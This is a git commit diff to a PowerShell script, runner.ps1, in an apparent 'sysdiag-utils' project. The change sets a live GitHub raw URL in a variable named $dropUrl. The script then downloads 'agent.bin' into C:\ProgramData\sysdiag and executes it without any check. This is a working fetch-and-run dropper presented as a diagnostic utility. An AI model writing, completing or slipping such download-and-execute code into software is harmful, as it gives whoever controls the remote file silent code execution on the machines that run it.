81e69c5efba1a2f9795ad2df5686412fc5804183
flocktrack <radiofrost@proton.me>
2025-08-02 01:22:12 -0400

    Update runner.ps1

--- runner.ps1
+++ runner.ps1
@@ -1,5 +1,5 @@
 Start-Sleep 3
-$dropUrl = "https://raw.githubusercontent.com/your-user/sysdiag-utils/main/agent.bin"
+$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/agent.bin"
 $destPath = "C:\ProgramData\sysdiag\agent.bin"
 Invoke-WebRequest -Uri $dropUrl -OutFile $destPath
 Start-Process $destPath
